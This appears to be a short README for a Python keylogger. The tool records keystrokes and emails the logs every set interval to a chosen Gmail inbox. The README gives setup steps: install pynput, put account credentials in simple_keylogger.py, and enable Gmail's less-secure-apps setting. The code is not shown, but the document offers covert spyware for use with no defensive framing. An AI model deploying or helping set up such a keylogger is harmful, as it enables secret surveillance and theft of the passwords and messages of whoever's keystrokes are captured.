A simple keylogger that reports logged keystrokes back to a selected gmail inbox. It requires a bit of a setup to use. First, it requires pynput library to be installed:
```
pip install pynput
```
Then, it requires interval, e-mail and password paramaters to be set in a simple_keylogger.py file:
```
simple_keylogger = keylogger.Keylogger(600, "yourgmailaccount@gmail.com", "password to that account")
```
In order to send/receive e-mails from a non-trused app it is required to enable less safe apps on the specified gmail account. It can be done using this link:
```
https://myaccount.google.com/lesssecureapps
```
After enabling that function and running simple_keylogger.py using one empty e-mail is going to be sent to the specified e-mail acount - this is a sign that the script is running.
